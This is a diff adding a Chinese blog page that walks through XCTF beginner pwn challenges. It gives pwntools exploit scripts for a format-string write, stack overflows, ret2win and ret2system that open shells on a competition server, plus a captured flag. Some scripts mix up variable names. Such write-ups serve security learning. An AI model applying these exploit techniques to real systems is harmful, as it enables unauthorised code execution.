@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sinky">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="get_shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019攻防世界pwn新手营">
+<meta property="og:url" content="https://sinky.top/2019/01/19/2019%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%90%A5/index.html">
+<meta property="og:site_name" content="Sinky&#39;s Blog">
+<meta property="og:description" content="get_shell">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/10/19/IcMXYtj74eiCFTA.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/QwHNaBIZY7vJGAz.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/cTjVNyKWiMR7ZDr.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/tba2xjIMn3dK79D.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/1I9OLvNFAgDWyli.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/yS7vgni8GtOPrXl.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/16/4gauoWUyezEV8DQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/3pWB2VC4xPDvRJZ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/TdyIebz7U1aDNvP.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/lCZkDg9aXbWVrRQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/chBvn87tUgLp6IP.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/oGHZBJhDQeAy5Yp.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/41InyaqQAEX5Dse.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/26/vx14aVYnwufJZ7r.png">
+<meta property="article:published_time" content="2019-01-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-11-27T07:36:52.000Z">
+<meta property="article:author" content="Sinky">
+<meta property="article:tag" content="Visionary">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/19/IcMXYtj74eiCFTA.png">
+  
+  
+  
+  <title>2019攻防世界pwn新手营 - Sinky&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sinky.top","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Sinky's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sinky</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2019攻防世界pwn新手营"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-01-19 00:00" pubdate>
+          January 19, 2019 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2019攻防世界pwn新手营</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h1><span id="more"></span>
+
+
+<p>Linux下nc，后直接cat flag.</p>
+<p><img src="https://i.loli.net/2019/10/19/IcMXYtj74eiCFTA.png" srcset="/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I5OwgLCNM-OaoOE3P5ZOKg">https://pan.baidu.com/s/1I5OwgLCNM-OaoOE3P5ZOKg</a><br>提取码：2c4w<br>考点：简单格式化字符串漏洞    </p>
+<p>在linux下查其保护机制，如图：</p>
+<p><img src="https://i.loli.net/2019/11/06/QwHNaBIZY7vJGAz.png" srcset="/img/loading.gif" lazyload alt="1.PNG"></p>
+<p>未开启PIE。<br>运行结果如图：<br><img src="https://i.loli.net/2019/11/16/cTjVNyKWiMR7ZDr.png" srcset="/img/loading.gif" lazyload alt="2.PNG"></p>
+<p>拖入IDA：</p>
+<p><img src="https://i.loli.net/2019/11/16/tba2xjIMn3dK79D.png" srcset="/img/loading.gif" lazyload alt="3.PNG"></p>
+<p>注意到代码 <code>printf(v8)</code>,为格式化字符串，点进pwnme:<br><code>.bss:0804A068 pwnme           dd ?                    ; DATA XREF: main+105r  </code><br>在.bss段的全局变量，因为没开启PIE，pwnme全局变量的地址不变,利用printf格式化字符串漏洞addr+%N$n修改任意地址的值。%N$n是以printf第N+1个参数位置的值为地址，printf中格式化字符串是第0个参数，将输出过的字符数量的值写入这个地址中    </p>
+<blockquote>
+<p>bss段（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小<br>data(已手动初始化的数据)段则为数据分配空间，数据保存在目标文件中。</p>
+</blockquote>
+<p>确定偏移量为10：(A 十六进制为41)</p>
+<p><img src="https://i.loli.net/2019/11/16/1I9OLvNFAgDWyli.png" srcset="/img/loading.gif" lazyload alt="4.PNG"></p>
+<p>pwnme地址本身占4个字节再加上4个字符使pwnme==8，得到flag.    </p>
+<p>exp:</p>
+<figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import * <span class="hljs-comment">#引入pwn模块</span><br> <span class="hljs-comment">#a=process('./cgfsb') #载入程序</span><br><span class="hljs-keyword">a</span>=remote(<span class="hljs-string">"111.198.29.45"</span>,<span class="hljs-string">"37361"</span>) <span class="hljs-comment">#通过socat将二进制文件运行在某个端口之后，可使用本语句建立连接，易于在本地与远程之间转换</span><br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">"please tell me your name:"</span>)<br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(<span class="hljs-string">'111'</span>) <span class="hljs-comment">#向程序输入111</span><br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">"leave your message please:"</span>)<br>dest=p32(<span class="hljs-number">0x0804A068</span>) <span class="hljs-comment">#用于将数据变成\x68\xA0\x04\x08的形式</span><br><span class="hljs-keyword">a</span>.<span class="hljs-built_in">send</span>(dest+<span class="hljs-string">"AAAA%10$n"</span>) <span class="hljs-comment">#向程序输入数据</span><br><span class="hljs-keyword">a</span>.interactive() <span class="hljs-comment">#拿到shell后，用此进行交互</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.loli.net/2019/11/16/yS7vgni8GtOPrXl.png" srcset="/img/loading.gif" lazyload alt="5.PNG"></p>
+<p>cyberpeace{2021a18f3d25c2c61176d710da2871f9}</p>
+<h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when _did _you _born"></a>when _did _you _born</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kDZYDTs6WKEAhagiZ4w4Hw">https://pan.baidu.com/s/1kDZYDTs6WKEAhagiZ4w4Hw</a><br>提取码：w2mt<br>查看保护机制：</p>
+<p><img src="https://i.loli.net/2019/11/16/4gauoWUyezEV8DQ.png" srcset="/img/loading.gif" lazyload alt="1.png"><br>查看关键：</p>
+<p><img src="https://i.loli.net/2019/11/25/3pWB2VC4xPDvRJZ.png" srcset="/img/loading.gif" lazyload alt="捕获.PNG"></p>
+<p>v6=1926即可得到flag，但是过滤了1926，gets()没有对输入检查可造成溢出，一直填充v6使v6=1926即可得到flag.<br>分别查看v5,v6，v5为var_20,v6为var_18，相差8个字符。<br>构造payload=’a’*8+p32(0x786)</p>
+<p><img src="https://i.loli.net/2019/11/26/TdyIebz7U1aDNvP.png" srcset="/img/loading.gif" lazyload alt="3.PNG"><br>exp:    </p>
+<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br> #<span class="hljs-attribute">p</span>=process('./when_did_you_born')<br><span class="hljs-attribute">p</span>=remote('111.198.29.45','51222')<br>p.recvuntil(<span class="hljs-string">"What's Your Birth?"</span>)<br>r.sendline(<span class="hljs-string">'2019'</span>)<br>r.recvuntil(<span class="hljs-string">"What's Your Name?"</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'a'</span>*8+p32(0x786)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></tbody></table></figure>
+<h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ftSV3ZOfC9pkfxTvxA3PCQ">https://pan.baidu.com/s/1ftSV3ZOfC9pkfxTvxA3PCQ</a><br>提取码：kv9x    </p>
+<h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><ul>
+<li>函数read:ssize_t read(int fd,void *buf,size_t count)<br>fd:文件描述符，fd为0从键盘读取<br>buf:指定的缓冲区，即指针，指向一段内存单元<br>count:要读入文件指定的字节数    </li>
+<li>功能：read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中，若参数count为0，则read()不会有作用并返回0.</li>
+<li>返回值：成功返回实际所读的字节数，返回0表示读到文件结束了，小于0表示出现错误。<br>关键代码如图：</li>
+</ul>
+<p><img src="https://i.loli.net/2019/11/26/lCZkDg9aXbWVrRQ.png" srcset="/img/loading.gif" lazyload alt="1.PNG"></p>
+<p>满足if条件则cat flag.可利用read()存在溢出，进行覆盖unk_60106C的值。</p>
+<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br> #<span class="hljs-attribute">p</span>=process('./hello_pwn')<br><span class="hljs-attribute">p</span>=remote('111.198.29.45',30903)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'a'</span>*4+p32(1853186401)<br>p.recvuntil(<span class="hljs-string">"bof"</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+
+<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tlYRK5xK8JeGWJ3rAPdj9w">https://pan.baidu.com/s/1tlYRK5xK8JeGWJ3rAPdj9w</a><br>提取码：fngx<br>checksec level0,发现NX保护。查看伪代码:    </p>
+<p><img src="https://i.loli.net/2019/11/26/chBvn87tUgLp6IP.png" srcset="/img/loading.gif" lazyload alt="1.PNG"></p>
+<p>返回vulnerable_function函数，存在read()函数溢出.<br><img src="https://i.loli.net/2019/11/26/oGHZBJhDQeAy5Yp.png" srcset="/img/loading.gif" lazyload alt="2.PNG"></p>
+<p>字符串搜索发现shell <code>/bin/sh</code> system函数可执行系统命令。<br>解题思路：read函数溢出执行system函数，system函数直接调用shell ,即可得到flag. </p>
+<p><img src="https://i.loli.net/2019/11/26/41InyaqQAEX5Dse.png" srcset="/img/loading.gif" lazyload alt="3.PNG"></p>
+<blockquote>
+<p>注：此为64位程序，与32位不同，无法直接传参。64位程序会先把参数存进寄存器中，前六个参数按顺序存储在寄存器rdi,rsi,rdx,rcx,r8,r9。    </p>
+</blockquote>
+<p>callsystem()函数地址0x400596,buf长度为0x80，shell长度为0x8.    </p>
+<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br> #<span class="hljs-attribute">p</span>=process('./level0')<br><span class="hljs-attribute">p</span>=remote('111.198.29.45',45394)<br>p.recvuntil(<span class="hljs-string">"Hello, World"</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'a'</span>*0x88+p64(0x400596)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/13vAx4VhcwzOzVTTAom8NvA">https://pan.baidu.com/s/13vAx4VhcwzOzVTTAom8NvA</a><br>提取码：6x0d     </p>
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>ROP:返回导向编程技术，将原来已经存在的代码块拼接起来，拼接方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。      </p>
+<p>有NX保护，查看关键伪代码，read()函数溢出利用。 </p>
+<p><img src="https://i.loli.net/2019/11/26/vx14aVYnwufJZ7r.png" srcset="/img/loading.gif" lazyload alt="1.PNG"></p>
+<p>buf长度0x88，字符串发现shell <code>/bin/sh</code>,4字节。<br>read溢出，利用system函数传参get shell.<br>_system地址：0x8048320<br>shell地址：0x804A024</p>
+<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br> #<span class="hljs-attribute">p</span>=process('./level2')<br><span class="hljs-attribute">p</span>=remote('111.198.29.45',59662)<br>p.recvuntil(<span class="hljs-string">"Input:"</span>)<br><span class="hljs-attribute">sys_add</span>=0x8048320<br><span class="hljs-attribute">shell_add</span>=0x804A024<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'a'</span>*(0x88+0x04)+p32(sys_add)+'aaaa'+p32(shell_add)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
+<h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1umrxzi-B7LcdC539Y7vXJQ">https://pan.baidu.com/s/1umrxzi-B7LcdC539Y7vXJQ</a><br>提取码：m2mv<br>注：这题字符串非常多，对我的耐性是一个严峻的挑战。<br>main函数如下：</p>
+<pre><code class="hljs">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  __int64 v3; // ST88_8@1
+  char *v4; // rax@1
+  char *v5; // ST18_8@1
+  __int64 result; // rax@1
+  __int64 v7; // rdx@1
+
+  v3 = *MK_FP(__FS__, 40LL);
+  setbuf(stdout, 0LL);
+  alarm(0x3Cu);
+  sub_400996(60LL, 0LL);
+  v4 = (char *)malloc(8uLL);
+  v5 = v4;
+  *(_DWORD *)v4 = 68;
+  *((_DWORD *)v4 + 1) = 85;
+  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
+  puts("we will tell you two secret ...");
+  printf("secret[0] is %x\n", v5, a2);
+  printf("secret[1] is %x\n", v5 + 4);
+  puts("do not tell anyone ");
+  sub_400D72(v5);
+  puts("The End.....Really?");
+  result = 0LL;
+  v7 = *MK_FP(__FS__, 40LL) ^ v3;
+  return result;
+}
+</code></pre>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Visionary/">#Visionary</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2019攻防世界pwn新手营</div>
+      <div>https://sinky.top/2019/01/19/2019攻防世界pwn新手营/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Sinky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 19, 2019</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/04/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%91%A8%E5%91%A8%E7%BB%83-Mysterious/" title="西湖论剑周周练 Mysterious">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">西湖论剑周周练 Mysterious</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
